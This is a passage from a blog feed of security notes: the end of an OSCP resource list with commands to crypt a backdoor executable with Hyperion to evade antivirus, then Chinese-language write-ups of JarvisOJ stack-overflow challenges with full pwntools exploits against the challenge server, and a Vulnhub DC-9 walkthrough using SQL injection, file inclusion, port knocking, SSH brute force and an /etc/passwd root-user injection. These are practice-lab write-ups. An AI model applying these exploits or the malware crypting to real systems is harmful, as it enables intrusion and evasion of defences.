Software</h1><ul><li><p>Crypting Known Malware with Software Protectors</p><ul><li><p>One such open source crypter, called Hyperion</p><p><code>cp /usr/share/windows-binaries/Hyperion-1.0.zip unzip Hyperion-1.0.zip cd Hyperion-1.0/ i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll . cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll . wine hyperion.exe ../backdoor.exe ../crypted.exe</code></p></li></ul></li></ul><h1 id="OSCP-Course-Review"><a href="#OSCP-Course-Review" class="headerlink" title="OSCP Course Review"></a>OSCP Course Review</h1><ul><li><p>Offensive Security’s PWB and OSCP — My Experience<br><a href="http://www.securitysift.com/offsec-pwb-oscp/"><em>http://www.securitysift.com/offsec-pwb-oscp/</em></a></p></li><li><p>OSCP Journey<br><a href="https://scriptkidd1e.wordpress.com/oscp-journey/"><em>https://scriptkidd1e.wordpress.com/oscp-journey/</em></a></p></li><li><p>Down with OSCP<br><a href="http://ch3rn0byl.com/down-with-oscp-yea-you-know-me/"><em>http://ch3rn0byl.com/down-with-oscp-yea-you-know-me/</em></a></p></li><li><p>Jolly Frogs - Tech Exams (Very thorough)</p></li></ul><p><a href="http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html"><em>http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html</em></a></p><h1 id="OSCP-Inspired-VMs-and-Walkthroughs"><a href="#OSCP-Inspired-VMs-and-Walkthroughs" class="headerlink" title="OSCP Inspired VMs and Walkthroughs"></a><span id="_pxmpirqr11x0" class="anchor"><span id="_Toc480741798" class="anchor"></span></span>OSCP Inspired VMs and Walkthroughs</h1><ul><li><p><a href="https://www.vulnhub.com/"><em>https://www.vulnhub.com/</em></a><br><a href="https://www.root-me.org/"><em>https://www.root-me.org/</em></a></p></li><li><p>Walk through of Tr0ll-1 - Inspired by on the Trolling found in the<br>OSCP exam<br><a href="https://highon.coffee/blog/tr0ll-1-walkthrough/"><em>https://highon.coffee/blog/tr0ll-1-walkthrough/</em></a><br>Another walk through for Tr0ll-1<br><a href="https://null-byte.wonderhowto.com/how-to/use-nmap-7-discover-vulnerabilities-launch-dos-attacks-and-more-0168788/"><em>https://null-byte.wonderhowto.com/how-to/use-nmap-7-discover-vulnerabilities-launch-dos-attacks-and-more-0168788/</em></a><br>Taming the troll - walkthrough<br><a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/"><em>https://leonjza.github.io/blog/2014/08/15/taming-the-troll/</em></a><br>Troll download on Vuln Hub<br><a href="https://www.vulnhub.com/entry/tr0ll-1,100/"><em>https://www.vulnhub.com/entry/tr0ll-1,100/</em></a></p></li><li><p>Sickos - Walkthrough:<br><a href="https://highon.coffee/blog/sickos-1-walkthrough/"><em>https://highon.coffee/blog/sickos-1-walkthrough/</em></a><br>Sickos - Inspired by Labs in OSCP<br><a href="https://www.vulnhub.com/series/sickos,70/"><em>https://www.vulnhub.com/series/</em></a><a href="https://www.vulnhub.com/series/sickos,70/">sickos</a><a href="https://www.vulnhub.com/series/sickos,70/"><em>,70&#x2F;</em></a></p></li><li><p>Lord of the Root Walk Through<br><a href="https://highon.coffee/blog/lord-of-the-root-walkthrough/"><em>https://highon.coffee/blog/lord-of-the-root-walkthrough/</em></a><br>Lord Of The Root: 1.0.1 - Inspired by OSCP<br><a href="https://www.vulnhub.com/series/lord-of-the-root,67/"><em>https://www.vulnhub.com/series/lord-of-the-root,67/</em></a></p></li><li><p>Tr0ll-2 Walk Through<br><a href="https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/"><em>https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/</em></a><br>Tr0ll-2<br><a href="https://www.vulnhub.com/entry/tr0ll-2,107/"><em>https://www.vulnhub.com/entry/tr0ll-2,107/</em></a></p></li></ul><h1 id="Cheat-Sheets"><a href="#Cheat-Sheets" class="headerlink" title="Cheat Sheets"></a><span id="_kfwx4om2dsj4" class="anchor"><span id="_Toc480741799" class="anchor"></span></span>Cheat Sheets</h1><ul><li><p>Penetration Tools Cheat Sheet<br><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/"><em>https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</em></a></p></li><li><p>Pen Testing Bookmarks<br><a href="https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md"><em>https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md</em></a></p></li><li><p>OSCP Cheatsheets<br><a href="https://github.com/slyth11907/Cheatsheets"><em>https://github.com/slyth11907/Cheatsheets</em></a></p></li><li><p>CEH Cheatsheet<br><a href="https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20CEH%20Cheat%20Sheet%20Exercises.pdf"><em>https://scadahacker.com/library/Documents/Cheat_Sheets&#x2F;Hacking%20-%20CEH%20Cheat%20Sheet%20Exercises.pdf</em></a></p></li><li><p>Net Bios Scan Cheat Sheet<br><a href="https://highon.coffee/blog/nbtscan-cheat-sheet/"><em>https://highon.coffee/blog/nbtscan-cheat-sheet/</em></a></p></li><li><p>Reverse Shell Cheat Sheet<br><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/"><em>https://highon.coffee/blog/reverse-shell-cheat-sheet/</em></a></p></li><li><p>NMap Cheat Sheet<br><a href="https://highon.coffee/blog/nmap-cheat-sheet/"><em>https://highon.coffee/blog/nmap-cheat-sheet/</em></a></p></li><li><p>Linux Commands Cheat Sheet<br><a href="https://highon.coffee/blog/linux-commands-cheat-sheet/"><em>https://highon.coffee/blog/linux-commands-cheat-sheet/</em></a></p></li><li><p>Security Hardening CentO 7<br><a href="https://highon.coffee/blog/security-harden-centos-7/"><em>https://highon.coffee/blog/security-harden-centos-7/</em></a></p></li><li><p>MetaSploit Cheatsheet<br><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf"><em>https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf</em></a></p></li><li><p>Google Hacking Database:<br><a href="https://www.exploit-db.com/google-hacking-database/"><em>https://www.exploit-db.com/google-hacking-database/</em></a></p></li><li><p>Windows Assembly Language Mega Primer<br><a href="http://www.securitytube.net/groups?operation=view&groupId=6"><em>http://www.securitytube.net/groups?operation=view&groupId=6</em></a></p></li><li><p>Linux Assembly Language Mega Primer<br><a href="http://www.securitytube.net/groups?operation=view&groupId=5"><em>http://www.securitytube.net/groups?operation=view&groupId=5</em></a></p></li><li><p>Metasploit Cheat Sheet<br><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf"><em>https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf</em></a></p></li><li><p>A bit dated but most is still relevant</p></li></ul><p><a href="http://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html"><em>http://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html</em></a></p><ul><li><p>NetCat</p></li><li><p><a href="http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf"><em>http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf</em></a></p></li><li><p><a href="http://www.secguru.com/files/cheatsheet/nessusNMAPcheatSheet.pdf"><em>http://www.secguru.com/files/cheatsheet/nessusNMAPcheatSheet.pdf</em></a></p></li><li><p><a href="http://sbdtools.googlecode.com/files/hping3_cheatsheet_v1.0-ENG.pdf"><em>http://sbdtools.googlecode.com/files/hping3_cheatsheet_v1.0-ENG.pdf</em></a></p></li><li><p><a href="http://sbdtools.googlecode.com/files/Nmap5%20cheatsheet%20eng%20v1.pdf"><em>http://sbdtools.googlecode.com/files/Nmap5%20cheatsheet%20eng%20v1.pdf</em></a></p></li><li><p><a href="http://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf"><em>http://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf</em></a></p></li><li><p><a href="http://rmccurdy.com/scripts/Metasploit%20meterpreter%20cheat%20sheet%20reference.html"><em>http://rmccurdy.com/scripts/Metasploit%20meterpreter%20cheat%20sheet%20reference.html</em></a></p></li><li><p><a href="http://h.ackack.net/cheat-sheets/netcat"><em>http://h.ackack.net/cheat-sheets/netcat</em></a></p></li></ul><h1 id="Essentials"><a href="#Essentials" class="headerlink" title="Essentials"></a>Essentials</h1><ul><li><p>Exploit-db<br><a href="https://www.exploit-db.com/"><em>https://www.exploit-db.com/</em></a></p></li><li><p>SecurityFocus - Vulnerability database<br><a href="http://www.securityfocus.com/"><em>http://www.securityfocus.com/</em></a></p></li><li><p>Vuln Hub - Vulnerable by design<br><a href="https://www.vulnhub.com/"><em>https://www.vulnhub.com/</em></a></p></li><li><p>Exploit Exercises<br><a href="https://exploit-exercises.com/"><em>https://exploit-exercises.com/</em></a></p></li><li><p>SecLists - collection of multiple types of lists used during<br>security assessments. List types include usernames, passwords, URLs,<br>sensitive data grep strings, fuzzing payloads<br><a href="https://github.com/danielmiessler/SecLists"><em>https://github.com/danielmiessler/SecLists</em></a></p></li><li><p>Security Tube<br><a href="http://www.securitytube.net/"><em>http://www.securitytube.net/</em></a></p></li><li><p>Metasploit Unleashed - free course on how to use Metasploit<br><a href="https://www.offensive-security.com/metasploit-unleashed/"><em>https://www.offensive-security.com/metasploit-unleashed</em></a><em>&#x2F;</em></p></li><li><p>0Day Security Enumeration Guide<br><a href="http://www.0daysecurity.com/penetration-testing/enumeration.html"><em>http://www.0daysecurity.com/penetration-testing/enumeration.html</em></a></p></li><li><p>Github IO Book - Pen Testing Methodology<br><a href="https://monkeysm8.gitbooks.io/pentesting-methodology/"><em>https://monkeysm8.gitbooks.io/pentesting-methodology/</em></a></p></li></ul><h1 id="Windows-Privledge-Escalation"><a href="#Windows-Privledge-Escalation" class="headerlink" title="Windows Privledge Escalation"></a>Windows Privledge Escalation</h1><ul><li><p>Fuzzy Security<br><a href="http://www.fuzzysecurity.com/tutorials/16.html"><em>http://www.fuzzysecurity.com/tutorials/16.html</em></a></p></li><li><p>accesschk.exe<br><a href="https://technet.microsoft.com/en-us/sysinternals/bb664922">https://technet.microsoft.com/en-us/sysinternals/bb664922</a></p></li><li><p>Windows Priv Escalation For Pen Testers<br><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></p></li><li><p>Elevating Privileges to Admin and Further<br><a href="https://hackmag.com/security/elevating-privileges-to-administrative-and-further/">https://hackmag.com/security/elevating-privileges-to-administrative-and-further/</a></p></li><li><p>Transfer files to windows machines<br><a href="https://blog.netspi.com/15-ways-to-download-a-file/">https://blog.netspi.com/15-ways-to-download-a-file/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> OCSP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level1 の Write-Up</title>
      <link href="/2020/05/07/XMAN-level1/"/>
      <url>/2020/05/07/XMAN-level1/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level1的Write-Up，比较简单。关键点在于当程序中没有现成的shellcode时，如何建立自己的shellcode并在buffer上布局。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>程序运行如下图所示，可见会显示一个奇怪的地址：</p><p><img src="/img/XMAN-level1/XMAN1.png"></p><p>还是一样的套路，checksec：32位程序，没有什么特殊的保护措施，并且栈上存在可读可写可执行的部分：</p><p><img src="/img/XMAN-level1/XMAN2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>将程序拖到hopper disassembler中，熟悉的vulnerable_function函数：</p><p><img src="/img/XMAN-level1/XMAN3.png" alt="main函数"></p><p><img src="/img/XMAN-level1/XMAN4.png" alt="vulnerable_function函数"></p><p>通过vulnerable_function函数的伪C代码可以明白之前出现的那个奇怪的地址其实是泄露的buf地址，那么我们就应该有思路了：</p><p><img src="/img/XMAN-level1/XMAN5.png"></p><p>首先左边是正常情况下栈中的布局情况，我们已知的是buf的起始地址。那么我们要做的是将ret的返回地址覆盖为buf的起始地址，这样我们就可以在buf中布局我们的shellcode。</p><p>右边是理想情况下我们布局后的栈中情况。</p><h2 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h2><p>找到思路，下面就是EXP的编写了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="number">9877</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./level1&#x27;)</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./level1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取buf地址</span></span><br><span class="line">buf = sh.recvline()[<span class="number">14</span>:<span class="number">22</span>]</span><br><span class="line"><span class="comment"># 将16进制地址字符串转换成十进制的地址</span></span><br><span class="line">buf_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">&quot;A&quot;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span> -<span class="built_in">len</span>(shellcode)) + p32(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>执行后就可以拿到shell啦：</p><p><img src="/img/XMAN-level1/XMAN6.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - DC-9 の Write-Up</title>
      <link href="/2020/05/06/DC-9/"/>
      <url>/2020/05/06/DC-9/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/">Vulnhub</a>之DC系列最后一台靶机<a href="http://www.five86.com/downloads/DC-9.zip">DC-9</a>的Write-up。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>老规矩还是先找靶机IP，然后做端口扫描：</p><p><img src="/img/DC-9/DC-9-1.png" alt="寻找靶机IP"></p><p><img src="/img/DC-9/DC-9-2.png" alt="扫描开放端口"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>访问80端口的WEB界面：</p><p><img src="/img/DC-9/DC-9-3.png"></p><p>最开始在search.php界面尝试了很久的SQL注入，甚至还用了Sqlmap，一无所获。后来经人提醒，在search之后的results.php界面存在注入漏洞，注入点为包的数据部分的search参数，所以sqlmap命令需要带上<code>--data=&quot;search=1&quot;</code>参数。</p><p><img src="/img/DC-9/DC-9-4.png" alt="获取数据库名"></p><p><img src="/img/DC-9/DC-9-5.png" alt="获取users数据库的表"></p><p><img src="/img/DC-9/DC-9-6.png" alt="获取users数据库中的数据"></p><p><img src="/img/DC-9/DC-9-7.png" alt="获取Staff数据库中的表"></p><p><img src="/img/DC-9/DC-9-8.png" alt="在Staff数据库的Users表中找到admin"></p><p>很明显admin的密码是md5加密的，通过解密得到admin用户的密码：transorbital1</p><p><img src="/img/DC-9/DC-9-9.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>通过admin账户登录系统：</p><p><img src="/img/DC-9/DC-9-10.png"></p><p>发现多了一个页面Add Record：</p><p><img src="/img/DC-9/DC-9-11.png"></p><p>在这个页面再次进行了多次的尝试依然一无所获。但是在Manage界面和Add Record界面下方都发现奇怪的<code>File does not exist</code>提示，大胆猜测存在本地文件包含漏洞，经过测试，果然在Manage界面找到这个漏洞：</p><p><img src="/img/DC-9/DC-9-12.png"></p><p>但是这个漏洞需要结合其他的漏洞组合利用，所以到这一步再次停顿。</p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>通过Internet Surfing了解到这里有个端口敲门服务（knockd），这是一种端口试探服务器工具。它侦听以太网或其他可用接口上的所有流量，等待特殊序列的端口命中(port-hit)。telnet或Putty等客户软件通过向服务器上的端口发送TCP或数据包来启动端口命中。</p><p>简单来说，就是需要知道ssh服务的自定义端口，然后依次发送数据包“敲门”，从而开启ssh服务。默认配置文件为<code>/etc/knockd.conf</code>，所以现在的思路就是通过上一步的本地文件包含漏洞，查看这个配置文件，获得自定义端口，然后依次敲门，开启靶机的算是服务。</p><p><img src="/img/DC-9/DC-9-13.png"></p><p>接下来是依次敲门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp -p 7469 172.16.83.135</span><br><span class="line">namp -p 8475 172.16.83.135</span><br><span class="line">namp -p 9842 172.16.83.135</span><br></pre></td></tr></table></figure><p><img src="/img/DC-9/DC-9-14.png"></p><p>敲门之后再次查看ssh端口，发现ssh服务已经开启（对比 Step 1 中的22端口扫描信息）。</p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>ssh服务开启后下一步就该是寻找登录凭证了，将在数据库中找到的所有用户信息综合起来进行22端口的目录爆破。</p><p>找到下列可用的账户：</p><p><img src="/img/DC-9/DC-9-15.png"></p><p>登录这三个账户仅在jamitor中发现一点有用的信息：</p><p><img src="/img/DC-9/DC-9-16.png"></p><p>这是一堆密码，把这些密码加入到制作的密码字典中去，再进行ssh爆破，发现多出来一个新的账号：</p><p><img src="/img/DC-9/DC-9-17.png"></p><p>用这个新的账号再次登录，也找不到什么有用的文件，但是当用<code>sudo -l</code>命令查看sudo权限可以执行什么命令时，发现一个奇怪的脚本：</p><p><img src="/img/DC-9/DC-9-18.png"></p><p>找到这个脚本看一下具体是什么内容：</p><p><img src="/img/DC-9/DC-9-19.png"></p><p>分析一下这个脚本发现通过这个程序可以以root权限合并文件内容，那么通过该脚本可以实现讲一个root权限的用户写入&#x2F;etc&#x2F;passwd中去。</p><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>首先利用openssl创建一个本地加密用户：<code>openssl -1 -salt admin1 admin1</code></p><p>-1 的意思是使用md5加密算法，-salt意思是自动插入一个随机数作为文件内容加密，即加盐：</p><p><img src="/img/DC-9/DC-9-20.png"></p><p>然后在靶机中运行test程序将刚才创建的用户写入到<code>/etc/passwd</code>中去，切换到新添加的用户即可：</p><p><img src="/img/DC-9/DC-9-21.png"></p><p>然后切换到root用户文件夹，接可以找到flag文件：</p><p><img src="/img/DC-9/DC-9-22.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> DC Series </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level2 の Write-Up</title>
      <link href="/2020/05/01/XMAN-level2/"/>
      <url>/2020/05/01/XMAN-level2/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level2的Write-Up，题目难度不大，还是栈溢出覆盖返回地址，不过涉及到二次覆盖。可是由于这是32位程序，加上没有什么保护措施，其实这个二次覆盖也很简单，适合Rookie详细了解PWN的机制。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>还是一样的套路，checksec：32位程序，没有什么特殊的保护措施：</p><p><img src="/img/XMAN-level2/XMAN1.png"></p><p>程序运行如下图所示：</p><p><img src="/img/XMAN-level2/XMAN2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>将程序拖到hopper disassembler中，还是熟悉的vulnerable_function函数，这次不同的是不再有callsystem函数直接利用了：</p><p><img src="/img/XMAN-level2/XMAN3.png"></p><p>但是发现存在system函数：</p><p><img src="/img/XMAN-level2/XMAN4.png"></p><p>所以需要调用这个函数传入参数，如“&#x2F;bin&#x2F;sh”，我们在程序里找一下有木有这个字符串：</p><p><img src="/img/XMAN-level2/XMAN5.png"></p><p>果然在数据中找到hint，这样思路就完整了。利用vulnerable_function函数的栈溢出覆盖返回地址，使得程序跳转到system函数，然后覆盖这个函数jmp到的GOT表地址为数据中的“&#x2F;bin&#x2F;sh”即可，下图为system函数的汇编代码：</p><p><img src="/img/XMAN-level2/XMAN6.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>最后就是EXP的编写了，下面给出代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./level2&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="number">9878</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shell_addr = elf.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(sys_addr) + p32(<span class="number">0xaaaaaaaa</span>) + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>有两个地方需要稍微注意一下：</p><ul><li><p>寻找’&#x2F;bin&#x2F;sh’时我是通过pwntools库ELF模块的search方法直接在程序中找（通过之前的分析确定程序中存在’&#x2F;bin&#x2F;sh’），其实由于Step 1中通过checksec发现程序并没有开启内存地址随机化保护，所以这里也可以替换成具体的’&#x2F;bin&#x2F;sh’地址（0x0804a024）</p></li><li><p>在构造payload的时候，跳转到system函数覆盖GOT表地址之前还需要给出system函数的返回地址，即0xaaaaaaaa</p></li></ul><p>执行EXP即可获得最终flag：</p><p><img src="/img/XMAN-level2/XMAN7.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level0 の Write-Up</title>
      <link href="/2020/05/01/XMAN-level0/"/>
      <url>/2020/05/01/XMAN-level0/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level0的Write-Up，也是第一次尝试PWN题，这题比较简单，就是简单的栈溢出覆盖返回地址，很适合刚上手的Rookie（比如我&#x3D;&#x3D;）。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先checksec一下程序：</p><p><img src="/img/XMAN-level0/XMAN1.png"></p><p>checksec是检查程序是否打开或关闭某些保护机制的一个脚本。相关参数意义为：</p><ul><li><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表；</p></li><li><p>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；</p></li><li><p>NX：NX enabled表示这个保护开启，意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用ROP这种方法绕过；</p></li><li><p>PIE：enabled表示启用内存布局随机化，如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址；</p></li><li><p>FORTIFY：FORTIFY_SOURCE机制对格式化字符串有两个限制：(1)包含%n的格式化字符串不能位于程序内存中的可写地址；(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</p></li></ul><p>运行程序如下图所示：</p><p><img src="/img/XMAN-level0/XMAN2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>把程序拖到Hopper Disassambler中看下伪C代码：</p><p><img src="/img/XMAN-level0/XMAN3.png"></p><p>函数中有个非常明显的vulnerable_function函数，明确的告诉我们存在漏洞，看下代码果然存在栈溢出漏洞。</p><p>然后还看到一个callsystem函数，在函数中调用了shell：</p><p><img src="/img/XMAN-level0/XMAN4.png"></p><p>这样思路就很简单了，通过vulnerable_function函数的栈溢出覆盖返回地址，跳转到callsystem函数入口调出shell。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>由vulnerable_function函数可以发现buffer到rbp的距离为0x80字节，加上0x08字节的rbp（64位程序中rbp为8字节，32位程序中为4字节），这样就可以得到vulnerable_function函数的返回地址了，然后把这个返回地址覆盖为callsystem函数的入口地址即可：</p><p><img src="/img/XMAN-level0/XMAN5.png"></p><h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>EXP代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./level0&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="number">9881</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> XMAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔 1</title>
      <link href="/2020/05/01/Diary1/"/>
      <url>/2020/05/01/Diary1/</url>
      
